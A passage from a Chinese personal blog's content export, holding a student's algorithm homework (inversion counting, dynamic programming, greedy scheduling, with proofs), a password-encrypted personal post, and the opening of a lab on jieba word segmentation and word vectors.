<h2 id="1-2-写出算法伪代码"><a href="#1-2-写出算法伪代码" class="headerlink" title="1.2 写出算法伪代码"></a>1.2 写出算法伪代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MS_OI</span><span class="params">(lists)</span>:</span>  <span class="comment">#merge_sort_Obvious_inversion</span></span><br><span class="line">    <span class="keyword">if</span> len(lists) &lt;= <span class="number">1</span>: <span class="comment">#若list个数小于一，直接返回</span></span><br><span class="line">        <span class="keyword">return</span> lists,<span class="number">0</span></span><br><span class="line">    middle = len(lists)/<span class="number">2</span>	<span class="comment">#mid是向下取整的数组中间指针</span></span><br><span class="line">    left,numA = MS_OI(lists[:middle]) <span class="comment">#计算有序左数组，以及左数组明显倒置个数</span></span><br><span class="line">    right,numB = MS_OI(lists[middle:]) <span class="comment">#计算有序右数组，以及右数组明显倒置个数</span></span><br><span class="line">    lists_sort,numC=merge_OV(left, right)<span class="comment">#计算有序list，以及左列右列数组明显倒置个数</span></span><br><span class="line">	<span class="keyword">return</span> lists_sort,(numA+numB+numC)   <span class="comment">#返回有序list，以及总明显倒置个数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_OV</span><span class="params">(left, right)</span>:</span></span><br><span class="line">    num=<span class="number">0</span></span><br><span class="line">    c = []  <span class="comment">#合并结果数组</span></span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    left_R=len(left)<span class="number">-1</span>  <span class="comment">#left数组最右边元素的下标，这里-1是因为python的数组从零开始</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; len(left) <span class="keyword">and</span> j &lt; len(right):</span><br><span class="line">        <span class="keyword">if</span> left[i] &lt; right[j]:  <span class="comment">#如果左数组当前元素i小于右数组当前元素j，则不满足“明显倒置”</span></span><br><span class="line">            c.append(left[i])</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:					<span class="comment">#如果左数组当前元素i小于右数组当前元素j，则满足“倒置”</span></span><br><span class="line">            <span class="keyword">if</span>(left[i] &gt; <span class="number">2</span>*right[j]):  <span class="comment">#在满足“倒置”的前提下，还满足“明显倒置”</span></span><br><span class="line">                num=num+<span class="number">1</span>		<span class="comment">#首先对这个明显倒置加1</span></span><br><span class="line">                <span class="comment">#因为在left数组中[i]右边的元素都大于[i]，都与当前的right[j]构成“明显倒置”</span></span><br><span class="line">                <span class="comment">#所以left数组中[i]右边的元素有多少个，num就加多少，即len(left)-i</span></span><br><span class="line">                num=num+left_R-i</span><br><span class="line">            c.append(right[j])</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == len(left): <span class="comment">#如果left数组已经遍历完，则把right剩下的直接全移到合并数组中</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> right[j:]:</span><br><span class="line">            c.append(x)</span><br><span class="line">    <span class="keyword">else</span>:			   <span class="comment">#如果right数组已经遍历完，则把left剩下的直接全移到合并数组中</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> left[i:]:</span><br><span class="line">            c.append(x)</span><br><span class="line">    <span class="keyword">return</span> c,num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    a = [<span class="number">4</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">9</span>]</span><br><span class="line">    lists_sort,num=MS_OI(a) <span class="comment">#计算num</span></span><br><span class="line">    print(num)</span><br></pre></td></tr></table></figure>

<h2 id="1-3-分析算法时间复杂度"><a href="#1-3-分析算法时间复杂度" class="headerlink" title="1.3 分析算法时间复杂度"></a>1.3 分析算法时间复杂度</h2><p>时间复杂度与归并排序的相同，都为nlog(n)</p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200427225822702.png" alt="image-20200427225822702"></p>
<h1 id="2-工作最优安排问题——动态规划"><a href="#2-工作最优安排问题——动态规划" class="headerlink" title="2.工作最优安排问题——动态规划"></a>2.工作最优安排问题——动态规划</h1><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200427225957321.png" alt="image-20200427225957321"></p>
<h2 id="2-1-描述算法思路"><a href="#2-1-描述算法思路" class="headerlink" title="2.1 描述算法思路"></a>2.1 描述算法思路</h2><p>这道题和我们之前做的  阿里面试题之求括号数、求走楼梯的方法数类似，都是一个数组内的线性规划问题。</p>
<p>我们用一个数组OPT来表示这道题，数组值对应各天最优解，明显是满足最优子结构的。</p>
<ul>
<li>首先计算0到2天的最优值，即两天之内的情况都工作不用休息<ul>
<li>OPT[0]=0、OPT[1]=w[1]、OPT[2]=w[1]+w[2]</li>
</ul>
</li>
<li>我们从i=3-&gt;k来遍历计算这个数组，对于每个OPT[i]，有三种情况：<ul>
<li>1天前的最优值+1天休息：OPT[i]=OPT[i-1]</li>
<li>2天前的最优值+1天休息+1天工作：OPT[i]=OPT[i-2]+w[i]</li>
<li>3天前的最优值+1天休息+2天工作：OPT[i]=OPT[i-3]+w[i-1]+w[i]</li>
</ul>
</li>
</ul>
<h2 id="2-2-OPT-k-递推式"><a href="#2-2-OPT-k-递推式" class="headerlink" title="2.2 OPT(k)递推式"></a>2.2 OPT(k)递推式</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># OPT(0)=0</span></span><br><span class="line"><span class="comment"># OPT(1)=w[1]</span></span><br><span class="line"><span class="comment"># OPT(2)=w[2]</span></span><br><span class="line">OPT(k)=max(OPT(k<span class="number">-1</span>),OPT(k<span class="number">-2</span>)+w[k],OPT(k<span class="number">-3</span>)+w[k<span class="number">-1</span>]+w[k])</span><br></pre></td></tr></table></figure>

<h2 id="2-3-写出算法伪代码"><a href="#2-3-写出算法伪代码" class="headerlink" title="2.3 写出算法伪代码"></a>2.3 写出算法伪代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work_arrange</span><span class="params">(w)</span></span></span><br><span class="line">	OPT=[len(w)]</span><br><span class="line">    <span class="keyword">if</span> len(w)&gt;=<span class="number">1</span>:	 <span class="comment">#一天（含）以上的OPT安排	</span></span><br><span class="line">        OPT[<span class="number">0</span>]=w[<span class="number">0</span>]  <span class="comment">#w[0]是工作第0天工作的工资，为零</span></span><br><span class="line">        OPT[<span class="number">1</span>]=w[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> len(w)&gt;=<span class="number">2</span>:	 <span class="comment">#两天（含）以上的OPT安排</span></span><br><span class="line">        OPT[<span class="number">2</span>]=w[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:			<span class="comment">#三天（含）以上的OPT安排</span></span><br><span class="line">        <span class="keyword">for</span> i=<span class="number">3</span> to len(w):  <span class="comment">#对于三天以上的每天，都有三种情况</span></span><br><span class="line">            OPT[i]=max(OPT[i<span class="number">-1</span>],OPT[i<span class="number">-2</span>]+w[i],OPT[i<span class="number">-3</span>]+w[i<span class="number">-1</span>]+w[i]) </span><br><span class="line">    <span class="keyword">return</span> OPT</span><br></pre></td></tr></table></figure>

<h2 id="2-4-分析算法时间复杂度"><a href="#2-4-分析算法时间复杂度" class="headerlink" title="2.4 分析算法时间复杂度"></a>2.4 分析算法时间复杂度</h2><p>O(n)，根据伪代码可知，我们的代码时间复杂度与n成正比。</p>
<p>直接证明法：推导递推式T(n)=T(n-1)+O(1)=T(n-2)+O(1)+O(1)=……=O(n)</p>
<p>数学归纳法证明：</p>
<ul>
<li>当<code>n=0、1、2</code>时，算法时间复杂度为<code>O(n)</code></li>
<li>设当<code>n=k</code>时，算法时间复杂度为<code>O(k)=O(n)</code>。而当<code>n=k+1</code>时，算法时间复杂度等于<code>O(k)+O(1)=O(k+1)=O(n)</code></li>
</ul>
<p>得证时间复杂度为O(n)</p>
<h1 id="3-棋盘硬币收集问题——动态规划"><a href="#3-棋盘硬币收集问题——动态规划" class="headerlink" title="3.棋盘硬币收集问题——动态规划"></a>3.棋盘硬币收集问题——动态规划</h1><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200427232332542.png" alt="image-20200427232332542"></p>
<h2 id="3-1-描述算法思路"><a href="#3-1-描述算法思路" class="headerlink" title="3.1 描述算法思路"></a>3.1 描述算法思路</h2><p>以下 <code>列即x坐标</code>，<code>行即y坐标</code></p>
<p>x+1往右，y+1往上</p>
<p>自顶向下遍历棋盘的行。</p>
<ul>
<li>首先计算第n行的所有格子的总价值，因为是最高的棋子，所以总价值就是自身价值。</li>
<li>然后计算第n-1行的总价值，第n-1行的每个格子的总价值计算公式如下：<ul>
<li>若是第1列：OPT(x,y)=max(OPT(x,y+1),OPT(x+1,y+1))+c(x,y)</li>
<li>若是第n列：OPT(x,y)=max(OPT(x,y+1),OPT(x-1,y+1))+c(x,y)</li>
<li>其余列：OPT(x,y)=max(OPT(x,y+1),OPT(x-1,y+1),OPT(x+1,y+1))+c(x,y)</li>
</ul>
</li>
<li>同上，自顶向下遍历行计算，最终，得到全棋盘格子可收集最大硬币总价值。</li>
</ul>
<p>⭐由于考虑到题目仅仅只计算底部任意一个格子的最大总价值，如下图：影响到OPT(x,y)的，仅仅是两条红色线以上的格子。所以我们可以在上述算法上做一点点修改，遍历行时可减少遍历格子数。可降低时间复杂度、提高计算效率。</p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200430172622350.png" alt="image-20200430172622350"></p>
<p>⭐由于题目可在最顶部任意一排格子结束，对于这个要求，我们同样只要加个约束就好了。</p>
<h2 id="3-2-OPT-x-y-递推式"><a href="#3-2-OPT-x-y-递推式" class="headerlink" title="3.2 OPT(x,y)递推式"></a>3.2 OPT(x,y)递推式</h2><ul>
<li>若是第0列：OPT(x,y)=max(OPT(x,y+1),OPT(x+1,y+1))+c(x,y)</li>
<li>若是第n列：OPT(x,y)=max(OPT(x,y+1),OPT(x-1,y+1))+c(x,y)</li>
<li>其余列：OPT(x,y)=max(OPT(x,y+1),OPT(x-1,y+1),OPT(x+1,y+1))+c(x,y)</li>
</ul>
<h2 id="3-3-写出算法伪代码"><a href="#3-3-写出算法伪代码" class="headerlink" title="3.3 写出算法伪代码"></a>3.3 写出算法伪代码</h2><p>以下下标，均是以python数组下标从零开始为前提。range(n)=[n-1,……,0]。</p>
<p> <code>列=x=i</code>，<code>行=y=j</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CHESS_COIN</span><span class="params">(c)</span>:</span></span><br><span class="line">    lenc=len(c)</span><br><span class="line">    OPT=[lenc][lenc]</span><br><span class="line"><span class="comment">#这是上半部分初始化最高行的代码：</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(lenc):    <span class="comment">#遍历最高行(y)的每列(x)，从0~n-1</span></span><br><span class="line">		 OPT(i,lenc<span class="number">-1</span>)=(i,lenc<span class="number">-1</span>)</span><br><span class="line"><span class="comment">#这是下半部分遍历计算的代码：</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(lenc<span class="number">-1</span>:<span class="number">0</span>):  <span class="comment">#遍历行(y)，从n-2~0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(lenc):  <span class="comment">#遍历列(x)，从0~n-1</span></span><br><span class="line">            <span class="keyword">if</span> i==<span class="number">0</span> :		 <span class="comment">#最左列</span></span><br><span class="line">                OPT(i,j)=max(OPT(i,j+<span class="number">1</span>),OPT(i+<span class="number">1</span>,j+<span class="number">1</span>))+c(i,j)</span><br><span class="line">            <span class="keyword">elif</span> i==n<span class="number">-1</span>:	<span class="comment">#最右列</span></span><br><span class="line">                OPT(i,j)=max(OPT(i,j+<span class="number">1</span>),OPT(i<span class="number">-1</span>,j+<span class="number">1</span>))+c(i,j)</span><br><span class="line">            <span class="keyword">else</span>:			<span class="comment">#其余列</span></span><br><span class="line">            	OPT(i,j)=max(OPT(i,j+<span class="number">1</span>),OPT(i<span class="number">-1</span>,j+<span class="number">1</span>),OPT(i+<span class="number">1</span>,j+<span class="number">1</span>))+c(i,j)</span><br><span class="line">    <span class="keyword">return</span> OPT</span><br></pre></td></tr></table></figure>

<p>⭐为了使达到题目中的要求：  你可以选择在在<code>最底部一排的任意格子开始</code>，在<code>最顶部一排的任意格子结束</code></p>
<ul>
<li><input checked disabled type="checkbox"> 我们在遍历最顶部行时，做一个条件判断是否为最后一个格子（第M列）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#这是上半部分初始化最高行的代码：</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(M):    <span class="comment">#遍历最高行(y)的每列(x)，从0~M-1</span></span><br><span class="line">		 OPT(i,lenc<span class="number">-1</span>)=(i,lenc<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(M:n<span class="number">-1</span>):  <span class="comment">#遍历最高行(y) 在M~n-1列的值</span></span><br><span class="line">        OPT(i,lenc<span class="number">-1</span>)=<span class="number">0</span></span><br></pre></td></tr></table></figure>

<ul>
<li><input checked disabled type="checkbox"> 我们在遍历行时要考虑函数是否在红线范围内，判断是否大于直线的值即可，</li>
<li><input checked disabled type="checkbox"> 设最底行的格子坐标为（a,b）这里写个伪代码：</li>
</ul>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200430172619021.png" alt="image-20200430172619021"></p>
<h2 id="3-4-分析算法时间复杂度"><a href="#3-4-分析算法时间复杂度" class="headerlink" title="3.4 分析算法时间复杂度"></a>3.4 分析算法时间复杂度</h2><p>⭐直接证明：</p>
<ul>
<li><p>对于题目——棋盘硬币收集问题来说，想要获得一个最底部的格子的最大价值，最少必须要遍历其上方的格子数=    <code>n^2</code> -  <code>(1/4)n^2</code> =<code>(3/4)n^2</code>  。即<code>(3/4)n^2</code>  &lt;=f(n) &lt;=  <code>n^2</code>  。</p>
</li>
<li><p>存在正的常数C=1和自然数n0=1，使得当n≥n0时， 有f(n)≤g(n)=n^2。</p>
</li>
<li><p>则称函数f (n) 在n 充分大时有上有界，且g(n) 是它的一个上界，记做f (n) = O(g(n))=O(n^2)</p>
</li>
</ul>
<p>⭐数学归纳法证明：</p>
<ul>
<li>当<code>n=1</code>时，算法时间复杂度为<code>O(n^2)</code></li>
<li>设当<code>n=k</code>时，算法时间复杂度为<code>O(k^2)=O(n^2)</code>。而当<code>n=k+1</code>时，算法时间复杂度等于<code>O((k+1)^2)=O(n^2)</code></li>
</ul>
<p>得证时间复杂度为O(n^2)</p>
<h2 id="3-5-证明不存在最差时间复杂度为小o-n-2-的动态规划算法"><a href="#3-5-证明不存在最差时间复杂度为小o-n-2-的动态规划算法" class="headerlink" title="3.5 证明不存在最差时间复杂度为小o(n^2)的动态规划算法"></a>3.5 证明不存在最差时间复杂度为小o(n^2)的动态规划算法</h2><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200430172833186.png" alt="image-20200430172833186"></p>
<p>反证法：</p>
<ul>
<li><p>假设存在一个动态规划算法的最差时间复杂度为<code>小o(n^2)</code> ，即<code>f(n)=o(g(n))</code>  。</p>
</li>
<li><p>即<code>0&lt;=f(n)&lt;=cg(n)</code>对于任意常量<code>c&gt;0</code>成立（n&gt;=n0）。</p>
</li>
<li><p>但是，对于题目——棋盘硬币收集问题来说，想要获得一个最底部的格子的最大价值，最少必须要遍历其上方的的格子数=  <code>n^2</code> -  <code>(1/4)n^2</code> =<code>(3/4)n^2</code>   。假如此时取c取<code>1/2</code>，则<code>0&lt;=f(n)&lt;=(1/2)g(n)</code>不成立，矛盾。</p>
</li>
<li><p>反证得不存在最差时间复杂度为<code>小o(n^2)</code>的动态规划算法，最优的算法时间复杂度只能是 <code>大O(n^2)</code>。</p>
</li>
</ul>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429180827475.png" alt="image-20200429180827475"></p>
<h1 id="4-dijkstra算法流程图——贪心"><a href="#4-dijkstra算法流程图——贪心" class="headerlink" title="4.dijkstra算法流程图——贪心"></a>4.dijkstra算法流程图——贪心</h1><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200427234432154.png" alt="image-20200427234432154"></p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200427234429347.png" alt="image-20200427234429347"></p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429171527226.png" alt="image-20200429171527226"></p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429171618826.png" alt="image-20200429171618826"></p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429171955315.png" alt="image-20200429171955315"></p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429172049824.png" alt="image-20200429172049824"></p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429172142515.png" alt="image-20200429172142515"></p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429172219858.png" alt="image-20200429172219858"></p>
<h1 id="5-kruskal-prim最小生成树——贪心"><a href="#5-kruskal-prim最小生成树——贪心" class="headerlink" title="5.kruskal\prim最小生成树——贪心"></a>5.kruskal\prim最小生成树——贪心</h1><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200427234524430.png" alt="image-20200427234524430"></p>
<h2 id="5-1-Kruskal"><a href="#5-1-Kruskal" class="headerlink" title="5.1 Kruskal"></a>5.1 Kruskal</h2><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429173903200.png" alt="image-20200429173903200"></p>
<h2 id="5-2-prim"><a href="#5-2-prim" class="headerlink" title="5.2 prim"></a>5.2 prim</h2><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429173645486.png" alt="image-20200429173645486"></p>
<h1 id="6-环内活动安排问题——贪心"><a href="#6-环内活动安排问题——贪心" class="headerlink" title="6.环内活动安排问题——贪心"></a>6.环内活动安排问题——贪心</h1><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200427234616837.png" alt="image-20200427234616837"></p>
<h2 id="6-1-描述算法思想"><a href="#6-1-描述算法思想" class="headerlink" title="6.1 描述算法思想"></a>6.1 描述算法思想</h2><p>该题，是一个环内的活动安排问题。我们可以遍历每个活动，将该活动从环中去除，余下的时间不成环，为普通活动安排问题。最后比较所有情况求得最优解。我们还可以用以下分类的方法，来减少一些计算量。    </p>
<p>考虑以下两种情况下的安排，并且从这些安排中选出最优的。</p>
<ul>
<li>最优的安排里没有过夜的活动，是一个0-24点的普通活动安排问题。</li>
<li>最优的安排里有过夜的活动，<strong>遍历过夜活动集每个过夜活动</strong>，剩下的也是普通活动安排问题。</li>
</ul>
<p>⭐其实，对于过夜的活动，我们还可以用一些小的技巧来减少计算量。但因为计算包含关系有时复杂度会很高，这里当作一个变式。</p>
<ul>
<li>若过夜活动两两不存在包含关系，则遍历计算，选择最优的安排。</li>
<li>对于活动A在活动B包含下的（即B开始早于A，结束晚于A，真子集关系），直接选择活动A。</li>
</ul>
<h2 id="6-2-分析算法时间复杂度"><a href="#6-2-分析算法时间复杂度" class="headerlink" title="6.2 分析算法时间复杂度"></a>6.2 分析算法时间复杂度</h2><p>考虑以下两种情况下的安排，并且从这些安排中选出最优的。</p>
<ul>
<li><p>首先以结束时间为基准，使用冒泡排序0am~24pm的活动。——O(nlogn)</p>
</li>
<li><p>遍历记下过夜的活动在排序数组中的位置，并且用一个数组将保存过夜活动——O(n)</p>
</li>
<li><p>最优的安排里没有过夜的活动，是一个0-24点的普通活动安排问题，得到<code>结果A</code>。——O(n)</p>
</li>
<li><p>最优的安排里有过夜活动，遍历每个过夜活动，剩下的也是普通活动安排问题，寻找该过夜活动(如下)—O(n)</p>
<ul>
<li>tips：对于活动A在活动B包含下的（即B开始早于A，结束晚于A，真子集关系），直接选择活动A。若过夜活动两两不存在包含关系，则遍历计算值，选择最优的安排。但是此操作会增加时间复杂度，可以作为变式使用。</li>
</ul>
</li>
<li><p>得到一个需要遍历的过夜活动集，<strong>遍历过夜活动集每个过夜活动</strong>。然后把它所占的区间从0-24小时中去除，然后从这个区间内使用普通活动安排方法计算，得到结果<code>B、C、D……</code>。——<strong>O(n^2)</strong></p>
</li>
<li><p>最后，对比几种情况<code>A、B、C……</code>选择最优值（最多活动）。——O(n)</p>
</li>
</ul>
<p>综上，一般情况下，算法时间复杂度为O(n^2)。</p>
<h2 id="6-3-证明算法正确性"><a href="#6-3-证明算法正确性" class="headerlink" title="6.3 证明算法正确性"></a>6.3 证明算法正确性</h2><h4 id="（1）贪心选择性质："><a href="#（1）贪心选择性质：" class="headerlink" title="（1）贪心选择性质："></a>（1）贪心选择性质：</h4><ul>
<li><p>对于不含跨夜活动的活动安排。是一个0~24小时普通活动的贪心选择：</p>
<ol>
<li><p>证：假设，存在一个最优解A（不含跨夜活动情况下），且A中的活动也按结束时间非递减排序。A中的第一个活动是K。（设从零点开始的最早结束的活动为F）</p>
</li>
<li><p>如果K是F，那A就是从0点开始的贪心选择。</p>
<p>如果K不是F，那么设B=A-{K}∪{F}，因为F早于K结束，且A中的活动是相容的。所以B中的活动也是相容的。又由于B中的活动个数与A中的活动个数相同，故A是最优的，即B是以F开始的最优活动安排。</p>
</li>
<li><p>所以，最优解A必包含F。</p>
</li>
</ol>
</li>
<li><p>对于含跨夜活动的活动安排：</p>
<ol>
<li><p>证：假设，含某跨夜活动X的最优解为A，且A中的活动也按结束时间非递减排序。A中的第一个活动是K。</p>
<p>（设F是X结束后开始的结束最早的活动安排）</p>
</li>
<li><p>如果K是F，那A就是去掉X所占区间后，从X结束时间开始的贪心选择。</p>
<p>如果K不是F，那么设B=A-{K}∪{F}，因为F早于K结束，且A中的活动是相容的。所以B中的活动也是相容的。又由于B中的活动个数与A中的活动个数相同，故A是最优的，即B是以F开始的最优活动安排。</p>
</li>
<li><p>所以，最优解A（含某跨夜活动X），是去掉X后，从X结束时间开始的普通活动安排贪心选择。</p>
</li>
</ol>
</li>
<li><p>对于两种类型的解，我们贪心选择活动数量最多的解。</p>
</li>
</ul>
<h4 id="（2）最优子结构性质："><a href="#（2）最优子结构性质：" class="headerlink" title="（2）最优子结构性质："></a>（2）最优子结构性质：</h4><ul>
<li>对于不含跨夜活动的活动安排。是一个0~24小时普通活动的贪心选择：<ul>
<li>反证法：假设A是活动集E最优解，A中第一个活动是K。设E去掉K后为E’，A去掉K之后为A’。</li>
<li>若E’中存在另一个解B‘ ，比A’有更多的活动，则将K加入B’中产生了另一个解B。这个B将比A拥有                更多的活动，与A的最优性矛盾。故最优解A去掉第一个活动K后，其子结构也是最优的。</li>
</ul>
</li>
<li>对于含跨夜活动的活动安排，同上。</li>
<li>对于以上两种解，我们总是选择的全局最优解，包含了子结构的的最优解。</li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>希望</title>
    <url>/2020/04/15/2020-04-15-HOPE/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。\n Oh, this is an invalid password. Check and try again, please." data-whm="解密内容无法验证，但您仍然可以看看。\n Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="加密文章，需要输入密码访问。</br> Hey, password is required here." /><label>加密文章，需要输入密码访问。</br> Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="9061359795e0bc61237d65d476e69623016175b655252c49cb0e64d4d212fb97">bbbb22e1e2503541a77611f6c73ce2a733623da08c387e766d87bb16bd51276bb0053cb3253bf94bea8a2cad62b73b5cf75c1784c770ec0a66daa7975554fc4e496a0c4a96fc733d4d75801b34e560160ca301fe61abc51a8051b8165e5bb7945f7ab63eb98895166e494b2a7e9bd134b8b698b78520178c70b73df2497d6977e296f6c0e369ff30da358ef9610ff5b749f3e0e659dedc80eacbaf01bb9f5475c19c3ed5d7cdc545cacea265293eb1c44d39104761851ad22e4cfa3bad56a814a94cf874d9072f5dbfb063697948fc08f7b84c5ad039dbf6e6decb2c5cd067f84d3753078a516386abe6ad7001af626eb458da4f16ba8d7e1191914f0778b248ef01bd3000c4ddc6f0130a92796742506f3088f09049b275bc8974c93ff985bacc8597c0b2e4925363b62b08e717c8a49e62fee2e5279df19c994c5c4b28d348f53ecf9aba448febe06524f6e65e3e835150635fd4e508b1540c381e1e9ee8b570afeaf941cb1410324f6cb0d53551a1baee5018f856c4226ad84dea51fda0d4b3a47387968cc5d533ce675536bfa5c1c422fc28d4b2b0dfe6c97eb444b93b4a3f6d366c30a69d47a445c2923e6ee229285ff4cde9c33d6b1bdcc976432d36d9e113058356c624ac1d4f9840f6970fa2cd296fb228d2bf578e5a2f7c6f82f6e86ab9b4619fffe3daa5a5c39efc9233a1d1919d00867f82742810f13a076f2eb78dc119398926d98089057f02861f7453191201876766dbe7923a907fd3cfd2a5cf9b6513fde096d4cdd3afdbd25bbc75a0e73ea6cfe6c22ce1b767d7b77ce4a3969b04cf8bdee22a9fdcbdee165a4d8a472f4daaab86da9935a7c67945b644e813fbf26b63d8aceb501a5696562c9f80fa0098eccf6cd65a095013e2e29576f83cc5e5973a515f0d8f73f902ffd3cd3be375945f9c82fcaec5c1fa113ed140002d3482db76d6568a5506768cd444c205a2b785954faf6aa22b5b83f8f54bb8a4223cbf1161775f939a0b4ac5db22a36af3ebc6d60a964eff03b435b2c14a9bae0d8bb51ddff4c928032a0459941307a058330655dfc28f50267715439adf8bf9b9f9d3b26cf9f982b57ed696ab709513a61ab013aa2e59251c9bc18633a43edb324021a8f1aa7f58ef47130ddd627b9136f509a9bc696105df25f57e010c4c4913676031cf9c91e6d40457bb14c5f0c5e4460da24096736887bc41b140a03a659b69d1e8f573858860e711e56a9cb8d44f418fbe90f1e83ca4a2254c2827fdf876f5be927229ca5476e4af141ab33fe9a0841190aa3be15a481c72a502b030d4e8025e9b27cc663d992333504abcce9c58c27976f3e4cd48924c6615de1cd4a2e6af6dfc3768381bd456f0836d8cab0470dc0294972425de71e6ea89c323c3bffbba49768c5623465ece63b24bed11d3</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>密文</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>信息内容安全实验2</title>
    <url>/2020/04/02/2020-04-02-inforamtion-security-exp-2/</url>
    <content><![CDATA[<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409163141122.png" alt="image-20200409163141122"></p>
<a id="more"></a>

<p>[TOC]</p>
<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>IDE：pycharm</p>
<p>python版本：anacoda-&gt;python3.7</p>
<h1 id="实验1-1-分词与词向量化"><a href="#实验1-1-分词与词向量化" class="headerlink" title="实验1.1-分词与词向量化"></a>实验1.1-分词与词向量化</h1><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><h3 id="1-分词"><a href="#1-分词" class="headerlink" title="1.分词"></a>1.分词</h3><p>对于西方拼音语言来讲，词之间有明确的分解符，统计和使用语言模型非常直接，而对于中文，词之间没有明确的分界符。因此需要对句子分词后，才能做自然语言处理。</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409164613616.png" alt="image-20200409164613616"></p>
<p>Python中分分词工具很多，包括盘古分词、Yaha分词、Jieba分词等。</p>
<p>这里选择<strong>Jieba</strong>（结巴）分词作为我们实验的工具</p>
<p><strong>安装</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install jieba</span><br></pre></td></tr></table></figure>

<p>常用方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#导入自定义词典  </span></span><br><span class="line">jieba.load_userdict(“字典路径\名称.txt<span class="string">")  </span></span><br><span class="line"><span class="string">#动态修改词典              </span></span><br><span class="line"><span class="string">add_word(word, freq=None, tag=None)</span></span><br><span class="line"><span class="string">del_word(word) </span></span><br><span class="line"><span class="string">#可调节单个词语的词频，使其能（或不能）被分出来</span></span><br><span class="line"><span class="string">suggest_freq(segment, tune=True) </span></span><br><span class="line"><span class="string">#关键词提取</span></span><br><span class="line"><span class="string">#sentence 为待提取的文本; topK默认值是20; </span></span><br><span class="line"><span class="string">#withWeight 为是否一并返回关键词权重值，默认值为 False; allowPOS 仅包括指定词性的词</span></span><br><span class="line"><span class="string">jieba.analyse.extract_tags(sentence, topK=20, withWeight=False, allowPOS=())</span></span><br><span class="line"><span class="string">#添加停用词</span></span><br><span class="line"><span class="string">jieba.analyse.set_stop_words(“extra_dict/stop_words.txt”)</span></span><br><span class="line"><span class="string">基于textrank的关键词提取</span></span><br><span class="line"><span class="string">tags = jieba.analyse.textrank(text, topK=5, withWeight=False, allowPOS=('ns', 'n', 'vn', 'v'))</span></span><br></pre></td></tr></table></figure>



<h3 id="2-词向量化"><a href="#2-词向量化" class="headerlink" title="2.词向量化"></a>2.词向量化</h3><p>自然语言理解的问题要转化为机器学习的问题，第一步肯定是要找一种方法把这些符号数学化。</p>
<p>NLP 中最直观，也是到目前为止最常用的词表示方法是 One-hot Representation。</p>
<p>这种方法把每个词表示为一个很长的向量。</p>
<p>这个向量的维度是词表大小，其中绝大多数元素为 0，只有一个维度的值为 1，这个维度就代表了当前的词。</p>
<p>​    举个例子：</p>
